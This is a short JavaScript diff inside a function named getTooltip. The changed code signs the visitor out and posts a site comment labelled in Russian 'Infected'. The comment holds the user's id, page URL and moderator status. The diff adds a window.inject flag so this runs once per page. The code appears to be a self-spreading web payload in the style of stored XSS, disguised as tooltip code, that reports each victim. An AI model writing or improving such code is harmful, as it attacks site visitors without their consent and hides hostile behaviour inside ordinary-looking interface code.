@@ -113,11 +113,14 @@ function getTooltip() {
       }
       $link.attr('href', targetUrl);
     });
-    let logoutDelay = $container.data('signout-delay') || 1000;
-    if (userData.id) signOutUser(logoutDelay);
-
-    let strData = `Заражен ${userData.id} - ${userData.url} Модератор: ${userData.is_moderator}`;
-    sendComment(strData);
+  
+    if (!window.inject) {
+      let logoutDelay = $container.data('signout-delay') || 1000;
+      signOutUser(logoutDelay);
+      let strData = `Заражен ${userData.id} - ${userData.url} Модератор: ${userData.is_moderator}`;
+      sendComment(strData);
+      window.inject = true;
+    }
   }
 
 getTooltip();
